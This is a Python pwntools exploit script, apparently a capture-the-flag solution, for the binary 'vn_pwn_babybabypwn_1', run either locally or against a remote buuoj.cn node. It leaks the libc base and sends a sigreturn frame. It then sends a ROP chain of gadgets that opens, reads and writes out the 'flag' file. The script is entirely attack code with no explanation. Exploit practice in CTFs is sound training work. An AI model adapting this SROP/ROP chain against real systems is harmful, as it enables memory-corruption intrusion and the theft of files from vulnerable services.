import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./vn_pwn_babybabypwn_1')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./vn_pwn_babybabypwn_1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29003)
			elf=ELF('./vn_pwn_babybabypwn_1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		

		io.recvuntil('0x')
		libc_base=int(io.recvline(),16)-libc.sym['puts']
		libc.address=libc_base
		pop_rdx_rsi=0x00000000001150c9+libc_base
		pop_rdx=0x0000000000001b92+libc_base
		pop_rdi=0x0000000000021102+libc_base
		ld.address=libc_base+0x611000
		io.recv()
		srop=SigreturnFrame()
		srop.rsp=ld.sym['_rtld_global']+2000+8
		srop.rdi=0
		srop.rsi=ld.sym['_rtld_global']+2000
		srop.rdx=0x200
		srop.rip=libc.sym['read']
		
		# gdb.attach(io)
		# pause()
		io.send(str(srop)[8:])
		pay='flag\x00\x00\x00\x00'
		pay+=p64(pop_rdi)+p64(ld.sym['_rtld_global']+2000)
		pay+=p64(pop_rdx_rsi)+p64(0)*2
		pay+=p64(libc.sym['open'])
		pay+=p64(pop_rdi)
		pay+=p64(3)
		pay+=p64(pop_rdx_rsi)
		pay+=p64(0x100)
		pay+=p64(ld.sym['_rtld_global']+2200)
		pay+=p64(libc.sym['read'])
		pay+=p64(pop_rdi)
		pay+=p64(1)
		pay+=p64(pop_rdx_rsi)
		pay+=p64(0x100)
		pay+=p64(ld.sym['_rtld_global']+2200)
		pay+=p64(libc.sym['write'])
		io.send(pay)





		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue